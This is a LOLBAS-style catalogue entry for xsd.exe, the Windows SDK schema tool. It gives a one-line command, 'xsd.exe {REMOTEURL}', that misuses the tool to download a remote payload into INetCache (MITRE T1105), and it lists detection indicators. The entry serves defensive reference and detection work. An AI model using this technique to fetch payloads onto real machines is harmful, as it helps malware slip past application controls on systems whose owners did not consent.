---
Acknowledgement:
- Person: Avihay El
Author: Avihay Eldad
Commands:
- Category: Download
  Command: xsd.exe {REMOTEURL}
  Description: Downloads payload from remote server
  MitreID: T1105
  OperatingSystem: Windows
  Privileges: User
  Tags:
  - Download: INetCache
  Usecase: It will download a remote payload and place it in INetCache
Created: 2024-04-09
Description: XML Schema Definition Tool included with the Windows Software Development
  Kit (SDK).
Detection:
- IOC: URL on a xsd.exe command line
- IOC: xsd.exe making unexpected network connections or DNS requests
Full_Path:
- Path: C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\bin\NETFX <version>
    Tools\xsd.exe
Name: xsd.exe
mitre_data:
  technique_ids:
  - T1105
tags:
- lolbas/othermsbinaries
---

# xsd.exe

XML Schema Definition Tool included with the Windows Software Development Kit (SDK).

# Path(s)

- `C:\Program Files (x86)\Microsoft SDKs\Windows\<version>\bin\NETFX <version> Tools\xsd.exe`

# Download Commands

Downloads payload from remote server

```batch
xsd.exe {REMOTEURL}
```

- **Usecase:** It will download a remote payload and place it in INetCache
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows


# Acknowledgements

- Avihay Eldad (Authored, 2024-04-09)
- Avihay El